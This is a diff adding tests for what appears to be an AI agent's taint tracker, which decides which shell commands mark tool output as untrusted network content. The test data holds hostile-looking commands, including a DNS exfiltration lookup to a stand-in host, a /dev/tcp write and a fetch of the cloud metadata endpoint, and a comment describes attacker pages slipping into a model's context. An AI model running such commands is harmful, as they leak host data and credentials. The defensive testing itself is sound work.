@@ -190,6 +190,99 @@ describe('what the turn treats as somebody else’s words', () => {
   });
 
   /**
+   * What the shell taint reader deliberately does not see, held so that coverage growing is a
+   * decision rather than a count moving.
+   *
+   * Every row here is a read the floor could be made to mark, and each one was left unmarked on
+   * purpose: marking `node ingest.js` marks every build on this computer, marking `ping` marks a
+   * turn for checking whether a host exists, and the reader is the literal address scan rather
+   * than the destination reader for exactly that reason. A change that makes any of these taint
+   * fails here with the reason beside it, and has to re-make the decision rather than discover it
+   * as a sink that started carding.
+   */
+  it('states the reads it deliberately does not see, so coverage cannot grow past a decision unnoticed', () => {
+    const shell = (script: string) => call('shell', { executable: 'bash', args: ['-lc', script] });
+    const unseen: ReadonlyArray<readonly [script: string, why: string]> = [
+      [
+        'node ingest.js',
+        'its address lives in its own configuration; what it fetched taints through process poll and log'
+      ],
+      ['ping -c1 192.168.1.1', 'a reachability check sends far more than it returns'],
+      ['echo hi > /dev/tcp/10.0.0.5/80', 'the write-only socket spelling brings nothing back'],
+      [
+        'dig $(cat /etc/hostname).collector.invalid',
+        'a lookup is a channel out, carded as egress, and not a fetch'
+      ]
+    ];
+    for (const [script, why] of unseen)
+      expect(untrustedOriginOfResult(shell(script), {}), `${script}: ${why}`).toBeNull();
+    // The redirect spelled as an argument to the executable, where no shell performs it: `cat`
+    // handed the literal `<` opens a file of that name, and no socket.
+    expect(
+      untrustedOriginOfResult(
+        call('shell', { executable: 'cat', args: ['<', '/dev/tcp/10.0.0.5/80'] }),
+        {}
+      )
+    ).toBeNull();
+    // The over-reach in the other direction, stated as well: no caller hands the reader a
+    // self-origin, so this box reading its own published preview is judged as another computer.
+    expect(untrustedOriginOfResult(shell('curl -s http://box.athanor.invalid/'), {})).toBe(
+      'network command output'
+    );
+    // And the coverage the limits are bounded by. The same estate read behind the prefixes a model
+    // puts in front of a command still taints, so a limit above cannot be reached by wrapping.
+    for (const script of [
+      'env FOO=1 curl -s http://192.168.1.50/notes',
+      'sudo curl -s http://192.168.1.50/notes',
+      'timeout 30 curl -s http://192.168.1.50/notes',
+      'cd app && curl -s http://10.0.0.5/x -o x.html',
+      'wget -q http://169.254.169.254/latest/meta-data/'
+    ])
+      expect(untrustedOriginOfResult(shell(script), {}), script).toBe('network command output');
+  });
+
+  /**
+   * The other direction of the same reader, at the product seam: a command that MENTIONS an
+   * address or a downloaded file and opens neither must not mark the turn. Each of these did -
+   * the version banner on the executable's name, the commit message and the grep through the
+   * literal address scan, the directory listing on the path - and every write after it on the
+   * same turn was carded as a tainted write.
+   */
+  it('marks nothing for a command that mentions an address, or a downloaded file, and opens neither', () => {
+    const shell = (script: string) => call('shell', { executable: 'bash', args: ['-lc', script] });
+    for (const script of [
+      'curl --version',
+      'curl -V',
+      'wget --version',
+      'export http_proxy=http://10.0.0.5:3128',
+      'echo http://192.168.1.50/notes',
+      'grep -r "http://wiki.internal" src/',
+      'git commit -m "point config at http://wiki.internal/runbook"',
+      'ls -la workspace/downloads/',
+      'stat workspace/downloads/terms.txt',
+      'rm workspace/downloads/terms.txt',
+      'test -f workspace/downloads/terms.txt',
+      'echo x > workspace/downloads/out.txt',
+      'npm install --offline',
+      'pip install -e .',
+      'pip install ./dist/x.whl'
+    ])
+      expect(untrustedOriginOfResult(shell(script), {}), script).toBeNull();
+    // And the reads beside them that must still mark: the same address reached through an
+    // interpreter, which only the literal scan sees, and a move out of the download directory,
+    // which is the last command the floor can see the bytes on.
+    for (const script of [
+      `python3 -c "import urllib.request;print(urllib.request.urlopen('http://192.168.1.50/notes').read())"`,
+      `node -e "fetch('http://192.168.1.50/notes')"`,
+      'curl -v http://192.168.1.50/notes'
+    ])
+      expect(untrustedOriginOfResult(shell(script), {}), script).toBe('network command output');
+    expect(untrustedOriginOfResult(shell('mv workspace/downloads/terms.txt archive/'), {})).toBe(
+      'downloaded file workspace/downloads/terms.txt'
+    );
+  });
+
+  /**
    * The delegate hole. A specialist runs the lead's read tools through the same executor but never
    * through the lead's provenance step, so "read these five pages and tell me what they say" used
    * to return five attacker-controlled pages, summarised by a model, into a window that the floor
